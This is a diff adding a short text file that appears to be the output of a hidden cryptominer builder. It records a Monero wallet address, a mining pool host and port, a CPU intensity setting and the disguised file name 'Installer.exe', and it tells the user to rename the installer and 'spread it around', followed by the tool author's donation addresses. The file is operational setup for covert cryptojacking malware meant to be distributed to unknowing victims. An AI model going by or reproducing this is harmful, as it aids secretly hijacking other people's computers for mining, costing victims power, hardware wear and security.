@@ -1,0 +1,12 @@
+This is the information of your hidden miner:
+Protocol: Cryptonote (e.g. monero)
+Address: 42RNp9Z1KTHTRavPvpCGSfSVmRRNq9Y9dPvwD2xCSHRKV6AwiRqkfbZdyv6Khqa72MJ5i4TGZTADJHKMg7T3iaMAKRzFoV7
+Miningpool: us.moriaxmr.com
+Port: 5555
+Intensity (CPU power): 4
+Name hidden miner: Installer.exe
+Now you can rename the installer in whatever you want and spread it around.
+
+If you feel like donating I accept donations:
+Monero: 4BJoj7wYwY7KKFArgRTFu1ELoCQBvFqUX7pGCTDNcCsgg93uQCrpktqc3GYBRARFjYMxrjNVNwMLLaFEJPjuUTNSMpdowq2
+Aeon: WmsrUsBrUpM3RbWZsq2PaWZqYgkiu1wgBGQRoJy1GUYUJ7j4kAiHfh1fQMPBSF4LAfH3SGB13BkzBQSCHpTgpatm1najb5v4F
